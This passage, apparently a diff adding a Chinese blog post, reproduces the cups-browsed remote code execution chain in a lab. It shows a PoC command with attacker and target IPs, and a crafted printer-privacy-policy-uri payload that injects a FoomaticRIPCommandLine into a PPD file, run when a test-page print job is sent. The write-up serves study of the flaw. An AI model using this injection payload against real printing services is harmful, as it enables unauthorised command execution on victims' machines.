+<p>python poc.py [evil-ip] [target-ip]</p>
+</blockquote>
+<p>这个脚本会在<code>[evil-ipp-server-ip]</code>上启动一个恶意的IPP服务器，并向目标机器<code>[target-ip]</code>上的Cups-Browsed服务发送一个UDP数据包。</p>
+<p>一旦Cups-Browsed接收到请求，它将尝试连接到恶意的IPP服务器并。IPP服务器会返回精心构造的<code>printer-privacy-policy-uri</code>属性，该属性中包含恶意payload，其结构如下：</p>
+<pre><code>(
+    SectionEnum.printer,
+    b&#39;printer-privacy-policy-uri&#39;,
+    TagEnum.uri
+): [b&#39;https://www.google.com/&quot;\n*FoomaticRIPCommandLine: &quot;&#39; +
+    b&#39;echo 1 &gt; /tmp/I_AM_VULNERABLE&#39; +
+    b&#39;&quot;\n*cupsFilter2 : &quot;application/pdf application/vnd.cups-postscript 0 foomatic-rip&#39;],
+</code></pre>
+<p>然后，Cups-Browsed会在<code>/tmp/</code>目录下创建一个临时PPD文件，我们的payload会被注入到这个文件中。下图是相关的Cups-Browsed日志：</p>
+<p><img src="/img/121.png" alt="img"></p>
+<p>此时，命令还未执行，因为我们需要至少一个打印任务来触发命令的执行。</p>
+<p>打印任务可能来自于正常用户，也可以来自攻击者。如果TCP 631端口开放，我们可以使用浏览器访问，并找到刚才增加的恶意IPP打印机，并创建一个“打印测试页面”的打印任务。</p>
+<p>这里环境打不开，先到这里吧。</p>
 </article><section class="jump-container is-flex is-justify-content-space-between my-6"><!-- em is empty placeholder--><em></em><a class="button is-default" href="/2024/11/17/%E8%87%AA%E5%A2%9ERCE/" title="自增RCE"><span class="has-text-weight-semibold">Next: 自增RCE</span><i class="iconfont icon-next ml-2 has-text-grey"></i></a></section><article class="mt-6 comment-container"><script async repo="https://github.com/Taninluv/Taninluv.github.io" src="https://utteranc.es/client.js" issue-term="pathname" theme="preferred-color-scheme"></script></article></div></div></main></main><footer class="is-flex is-flex-direction-column is-align-items-center is-flex-shrink-0 is-family-serif"><section class="sns-container"><!-- Github--><a title="github" target="_blank" rel="noopener nofollow" href="//github.com/Taninluv"><i class="iconfont icon-github"></i></a><!-- Ins--><!-- RSS--><!-- 知乎--><!-- 领英--><!-- 脸书--></section><p><span>Copyright ©</span><span> Taninluv 2024</span></p><div class="is-flex is-justify-content-center is-flex-wrap-wrap"><p>Powered by Hexo &verbar;&nbsp;</p><p class="is-flex is-justify-content-center"><a title="Hexo theme author" target="_blank" rel="noopener" href="//github.com/haojen">Theme by Haojen&nbsp;</a></p><div style="margin-top: 2px"><a class="github-button" title="github-button" target="_blank" rel="noopener" href="https://github.com/haojen/hexo-theme-Claudia" data-color-scheme="no-preference: light; light: light; dark: dark;" data-show-count="true"></a></div></div><div><span></span></div></footer><script async defer src="https://buttons.github.io/buttons.js"></script><script src="/js/jquery-3.6.1.min.js"></script><script src="/js/jquery-fancybox.min.js"></script><script src="/js/img_zoom.js"></script><script src="/js/post.js"></script></body></html>
